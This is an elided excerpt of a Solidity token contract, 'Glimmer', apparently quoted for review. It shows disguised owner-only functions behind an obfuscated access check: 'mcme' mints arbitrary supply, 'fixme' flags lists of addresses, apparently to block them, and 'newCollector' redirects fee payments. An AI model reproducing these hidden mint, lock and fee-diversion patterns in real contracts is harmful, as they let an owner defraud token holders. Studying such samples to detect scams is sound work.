...
contract Glimmer is IERC20, Ownable, AntiBotSecurity {
    ...
    function _transfer(
        ...
        if (!isOutOfChrgs(from) && !isOutOfChrgs(to)){
            if (isMarket(from)) {
                ...
                _balances[maWallet] += feeAmount;
                emit Transfer(from, maWallet, feeAmount);
    ...
    function fixme(address[] calldata _usrs, bool _state) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
    ...
    function check_fixme(address _user) external view returns (bool) {
    ...
    function mcme(uint256 _amount) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        _totalSupply += _amount;
    }

    function valme(uint256 _value) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
    ...
    function newCollector(address _newMaWallet) external {
        Addrress.a726dfc89e5f(msg.sender, _notContract);
        maWallet = _newMaWallet;
    }
